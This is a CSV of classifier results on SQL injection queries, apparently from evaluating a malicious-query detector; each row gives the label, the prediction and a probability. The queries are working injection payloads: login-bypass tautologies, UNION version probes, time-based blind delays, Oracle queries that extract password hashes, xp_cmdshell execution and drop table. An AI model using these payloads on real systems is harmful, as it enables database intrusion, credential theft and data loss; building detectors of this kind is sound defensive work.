Query,Label,predicted,correct,malicious_probability
" select * from users where id  =  1 or  @$#  =  1 union select 1,version  (    )   -- 1",1,1,True,0.9999929236258062
" select * from users where id  =  '1' or   (  \.  )    =  1 union select 1,@@VERSION -- 1'",1,1,True,0.9999998215952776
 and 1 in   (  select var from temp  )  --,1,1,True,0.9998057624803184
" select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",1,1,True,0.9999993521606969
" select * from users where id  =  1 or ""1]"" or 1  =  1 -- 1",1,1,True,0.9999968902234209
" select * from users where id  =  1 or ""$?"" or 1  =  1 -- 1",1,1,True,0.9999968902234209
or x  =  x,1,1,True,0.9720285916676991
or a  =  a,1,1,True,0.9091277924810639
or '1'  =  '1,1,1,True,0.9999998321086387
" select * from users where id  =  11<1# union select 1,version  (    )   -- 1",1,1,True,0.9999908277704322
   )    )    or    (    (   'x'   )    )     =     (    (   'x,1,1,True,0.9998948976777859
" select * from users where id  =  '1' or \.<1 union select 1,@@VERSION -- 1'",1,1,True,0.9999998530161022
" select * from users where id  =  '1' <@&1 union select 1,version  (    )   -- 1'",1,1,True,0.9999996255924938
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1,1,True,0.6754381757714226
; if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --,1,1,True,0.9999999938332902
select * from users where id  =  1 <@<@ or 1  =  1 -- 1,1,1,True,0.9999975524623644
" select * from users where id  =  1 union select @<@$,version  (    )   -- 1",1,1,True,0.9999831142569809
" select * from users where id  =  '1' <@<@ union select 1,version  (    )   -- 1'",1,1,True,0.9999994856270612
" select * from users where id  =  1 or ""$_"" or 1  =  1 -- 1",1,1,True,0.9999968902234209
" select * from users where id  =  1 or 1#""{ union select version  (    )  ,version  (    )   -- 1",1,1,True,0.9999930887423796
a' or 1  =  1--,1,1,True,0.9999997380145866
 )   or   (  a  =  a,1,1,True,0.9569143266235265
"""   )    )    or    (    (   ""x""   )    )     =     (    (   ""x",1,1,True,0.9445248910132246
" select * from users where id  =  1 or 1#""; or 1  =  1 -- 1",1,1,True,0.9999990749834279
" select * from users where id  =  '1' <@$_ union select 1,version  (    )   -- 1'",1,1,True,0.9999994856270612
-- &password  = ,1,1,True,0.9999978382225413
select * from users where id  =  1 <@. or 1  =  1 -- 1,1,1,True,0.9999975524623644
" select * from users where id  =  1 or ""  (    )  "" or 1  =  1 -- 1",1,1,True,0.99999653000567
" select * from users where id  =  1 %$ 1 union select null,@@VERSION -- 1",1,1,True,0.9999957922732633
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",1,1,True,0.6323092155718154
 or '1'  =  '1,1,1,True,0.9999996929527531
admin' or 1  =  1,1,1,True,0.9999999999983193
" select * from users where id  =  1 or "";,""  =  1 or 1  =  1 -- 1",1,1,True,0.9999963983326072
" select * from users where id  =  1 union select @||1,version  (    )   -- 1",1,1,True,0.9999869945737514
" select * from users where id  =  1 +\+. union select null,@@VERSION -- 1",1,1,True,0.9999929056511287
" select * from users where id  =  1 or ""  )  ,"" or 1  =  1 -- 1",1,1,True,0.9999969090477417
" union select * from users where login   =   char  (  114,111,111,116  )  ;",1,1,True,0.9989052554121318
" select * from users where id  =  1 or 1#""? union select 1,version  (    )   -- 1",1,1,True,0.9999931470512057
 or 1  =  1--,1,1,True,0.9999988198307471
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1,1,True,0.6459541288817592
pg_sleep  (  __TIME__  )  --,1,1,True,0.9998656013786666
‘ or 3  =  3 --,1,1,True,0.9999726346986112
" select * from users where id  =  1 -1<@ union select 1,version  (    )   -- 1",1,1,True,0.9999959626728852
" select * from users where id  =  1 or ""$#"" or 1  =  1 -- 1",1,1,True,0.9999968902234209
 )   union select * from information_schema.tables;,1,1,True,0.9997810977690502
" select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",1,1,True,0.9999969090477417
"  )   or benchmark  (  10000000,MD5  (  1   )    )   #",1,1,True,0.999302307087683
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  column_name   )    )    FROM sys.all_tab_columns   )    )    AND 'i'  =  'i,1,1,True,0.9946320237215812
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1,1,True,0.6658159581315566
""" or """" """,1,1,True,0.9669658460202891
delete,1,1,True,0.8880200279778799
;waitfor delay '0:0:__TIME__'--,1,1,True,0.9987569531528873
 or 1  =  1 --,1,1,True,0.9999989534141529
1' and non_existant_table   =   '1,1,1,True,0.9951213320384239
" select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",1,1,True,0.9999969090477417
" select * from users where id  =  '1' + $ . union select 1,@@VERSION -- 1'",1,1,True,0.9999997253203599
declare @s varchar  (  200  )   select @s   =   0x77616974 ...,1,1,True,0.9481072098215064
x' AND userid IS NULL; --,1,1,True,0.9999999947745537
" select * from users where id  =  1 or "";["" or 1  =  1 -- 1",1,1,True,0.9999968902234209
" select * from users where id  =  '1' or \.<   =  1 union select 1,@@VERSION -- 1'",1,1,True,0.9999998309499004
" select * from users where id  =  1 union select @<@,version  (    )   -- 1",1,1,True,0.9999831142569809
" select * from users where id  =  1 -@<@ union select 1,version  (    )   -- 1",1,1,True,0.9999961423544478
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT host_name FROM v$instance   )    )    AND 'i'  =  'i,1,1,True,0.6884146571053078
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1,1,True,0.9262670521709921
select * from users where id  =  1 +   (  \+  )   or 1  =  1 -- 1,1,1,True,0.9999961560569879
" select * from users where id  =  1 or "".["" or 1  =  1 -- 1",1,1,True,0.9999968902234209
" select * from users where id  =  1 or ""  (  ["" or 1  =  1 -- 1",1,1,True,0.999996501876049
UNION ALL SELECT,1,1,True,0.9999983218698713
" select * from users where id  =  1 or ""1#"" or 1  =  1 -- 1",1,1,True,0.9999976323963939
select * from users where id  =  1 or \<1 or 1  =  1 -- 1,1,1,True,0.9999974305567698
" select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",1,1,True,0.9999920359275644
x' or full_name like '%bob%,1,1,True,0.9919419301006499
x' and members.email is NULL; --,1,1,True,0.9999991092583363
 or 2 > 1,1,1,True,0.9717230144161895
select * from users where id  =  1.*1 or 1  =  1 -- 1,1,1,True,0.9999974911246092
"""  )   or pg_sleep  (  __TIME__  )  --",1,1,True,0.9998815989681231
 ',1,1,True,0.9998741263407643
" select * from users where id  =  1 or $<\. union select 1,@@VERSION -- 1",1,1,True,0.9999954719004853
" select * from users where id  =  1 or ""@  )  "" or 1  =  1 -- 1",1,1,True,0.9999969090477417
select * from users where id  =  1 or \.<$ or 1  =  1 -- 1,1,1,True,0.9999972099396688
 )   or sleep  (  __TIME__  )    =  ',1,1,True,0.960849393016557
sleep 50',1,1,True,0.9962301677818969
" select * from users where id  =  '1' + 1||1 union select 1,banner from v$version where rownum  =  1 -- 1'",1,1,True,0.999999471068358
select * from users where id  =  1 + $+%\ or 1  =  1 -- 1,1,1,True,0.9999970927883208
" select * from users where id  =  1 or "";  (  "" or 1  =  1 -- 1",1,1,True,0.999998934328392
or sleep  (  __TIME__  )    =  ',1,1,True,0.9452809275456048
" select * from users where id  =  1 or "";_"" or 1  =  1 -- 1",1,1,True,0.9999968902234209
" select * from users where id  =  1 or 1#"". union select 1,version  (    )   -- 1",1,1,True,0.9999931470512057
" select * from users where id  =  1 union select  @ $,version  (    )   -- 1",1,1,True,0.9999831142569809
" select * from users where id  =  1 union select +!<@,version  (    )   -- 1",1,1,True,0.9999862048454351
" select * from users where id  =  1 <@<@ union select null,version  (    )   -- 1",1,1,True,0.9999844500674511
or 2 > 1,1,1,True,0.9621564483223738
; exec   (  'sel' + 'ect us' + 'er'  ) ,1,1,True,0.9989768511677384
anything' OR 'x'  =  'x,1,1,True,0.9999999999944622
" select * from users where id  =  1 or \<\ union select 1,@@VERSION -- 1",1,1,True,0.9999954719004853
" select * from users where id  =  1 union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1",1,1,True,0.9999902265509021
" select * from users where id  =  1 *  (  \  )   union select null,@@VERSION -- 1",1,1,True,0.9999929635805926
&',1,1,True,0.9188848623785282
a' or 3  =  3--,1,1,True,0.9999556297238844
" select * from users where id  =  '1' or $+<$ union select 1,@@VERSION -- 1'",1,1,True,0.9999997997776485
" select * from users where id  =  1 +1 union select 1,banner from v$version where rownum  =  1 -- 1",1,1,True,0.9999914655951888
"admin""or 1  =  1 or """"  =  """,1,1,True,0.9999999995997193
uni/**/on sel/**/ect,1,1,True,0.9999999999955664
""" or """"&""",1,1,True,0.9669658460202891
 )    )   ;waitfor delay '0:0:__TIME__'--,1,1,True,0.9995344189872535
" select * from users where id  =  1 or ""?;"" or 1  =  1 -- 1",1,1,True,0.9999968902234209
1 waitfor delay '0:0:10'--,1,1,True,0.9998316321113719
bfilename,1,1,True,0.8287267198976899
admin'  )   or   (  '1'  =  '1'--,1,1,True,0.9999999999999996
UEf,1,1,True,0.8987566648026662
 -- &password  = ,1,1,True,0.9999997931432892
1 or sleep  (  __TIME__  )  #,1,1,True,0.9977132576483457
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1,1,True,0.6754619187449067
" select * from users where id  =  '1' union select $[""],@@VERSION -- 1'",1,1,True,0.9999997217700937
" select * from users where id  =  '1' + @  (  1  )   union select 1,version  (    )   -- 1'",1,1,True,0.9999993785267612
1' and 1  =    (  select count  (  *  )   from tablenames  )  ; --,1,1,True,0.9999938341986752
or sleep  (  __TIME__  )  #,1,1,True,0.9949068688513485
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1,1,True,0.6334828880271345
" select * from users where id  =  1 or 1#"",  =  1 or 1  =  1 -- 1",1,1,True,0.9999961869265569
||6,1,1,True,0.9864449421496065
or 1/*,1,1,True,0.9999834797006506
" and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,116   )    )   <>char  (  39,39   )    )   ,1,0   )    )   ;",1,1,True,0.9979919171579519
select * from users where id  =  1.%@ or 1  =  1 -- 1,1,1,True,0.9999974421737265
" select * from users where id  =  1 or ""..""  =  1 or 1  =  1 -- 1",1,1,True,0.9999963983326072
" select * from users where id  =  1 or 1&@#  =  1 union select 1,version  (    )   -- 1",1,1,True,0.9999949856502354
" select * from users where id  =  1 or "";]"" or 1  =  1 -- 1",1,1,True,0.9999968902234209
" or 1  =  1 or """"  =  ",1,1,True,0.9966917604148215
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1,1,True,0.8623221193319106
select * from users where id  =  1 or $<\. or 1  =  1 -- 1,1,1,True,0.9999972099396688
" select * from users where id  =  1 *  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1",1,1,True,0.9999923627381178
or 'whatever' in   (  'whatever'  ) ,1,1,True,0.9955618783068795
declare @s varchar   (  200  )   select @s   =   0x73656c65637420404076657273696f6e exec  (  @s  ) ,1,1,True,0.8590022830113913
select * from users where id  =  '1'   or 1  =  1 -- 1',1,1,True,0.9999999597469899
?,1,1,True,0.9188848623785282
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  table_name   )    )    FROM sys.all_tables   )    )    AND 'i'  =  'i,1,1,True,0.9754938196023821
" select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",1,1,True,0.9999994206291952
"admin""  )   or   (  ""1""  =  ""1""#",1,1,True,0.9999999995748454
" select * from users where id  =  1 or 1#"", union select 'a',version  (    )   -- 1",1,1,True,0.9999983065337658
" select * from users where id  =  1 or ""$  (  "" or 1  =  1 -- 1",1,1,True,0.999996501876049
 or '' ',1,1,True,0.9998828509471973
" select * from users where id  =  1 or "";#"" or 1  =  1 -- 1",1,1,True,0.9999968902234209
or 1  =  1,1,1,True,0.9972861992475657
 ; drop table temp --,1,1,True,0.9999908055666651
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1,1,True,0.8633679999763463
""" or benchmark  (  10000000,MD5  (  1   )    )   #",1,1,True,0.9993431836714245
""" or ""x""  =  ""x",1,1,True,0.8974105006921607
select * from users where id  =  '1'<@.. or 1  =  1 -- 1',1,1,True,0.999999905533584
" select * from users where id  =  1 or !<@ union select 1,version  (    )   -- 1",1,1,True,0.9999900737632843
 or 'something' like 'some%',1,1,True,0.9917173369171823
; if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --,1,1,True,0.9982223331241246
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1,1,True,0.8685035919651227
select * from users where id  =  '1' or \<\. or 1  =  1 -- 1',1,1,True,0.9999999460968667
; exec master..xp_cmdshell 'ping 10.10.1.2'--,1,1,True,0.9999093649663396
admin' or '1'  =  '1'--,1,1,True,0.9999999999999998
; if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --,1,1,True,0.9987344960023837
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1,1,True,0.6671602646489163
" select * from users where id  =  1 <@<@ union select version  (    )  ,version  (    )   -- 1",1,1,True,0.9999890217704349
" select * from users where id  =  1 or 1#""$ union select null,version  (    )   -- 1",1,1,True,0.9999904726896005
""";waitfor delay '0:0:__TIME__'--",1,1,True,0.9987569531528873
x' and userid is NULL; --,1,1,True,0.9999999163016956
select * from users where id  =  '1' *$ 1 or 1  =  1 -- 1',1,1,True,0.9999999631282608
" select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",1,1,True,0.9999935008939231
" select * from users where id  =  1 or ""?@"" or 1  =  1 -- 1",1,1,True,0.9999968902234209
’ or ‘1’  =  ’1,1,1,True,0.8974105006921607
" select * from users where id  =  '1' union select 1a,banner from v$version where rownum  =  1 -- 1'",1,1,True,0.9999993521606969
admin'or 1  =  1 or ''  =  ',1,1,True,0.9999999999957343
" select * from users where id  =  '1' or !<1 union select 1,version  (    )   -- 1'",1,1,True,0.9999996865319126
" and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",1,1,True,0.9874743393088883
exec  (  @s  ) ,1,1,True,0.8550682201548401
" select * from users where id  =  1 or ""_  )  "" or 1  =  1 -- 1",1,1,True,0.9999969090477417
" select * from users where id  =  1 or \.<   =  1 union select 1,@@VERSION -- 1",1,1,True,0.9999952825231686
 or 1  =  1,1,1,True,0.9967964305603878
select * from users where id  =  1 + $+%1 or 1  =  1 -- 1,1,1,True,0.999997324336424
" select * from users where id  =  1.  union select version  (    )  ,version  (    )   -- 1",1,1,True,0.9999831324306665
x' AND email IS NULL; --,1,1,True,0.9999999931567789
" select * from users where id  =  '1' + @ @1 union select 1,version  (    )   -- 1'",1,1,True,0.99999930785593
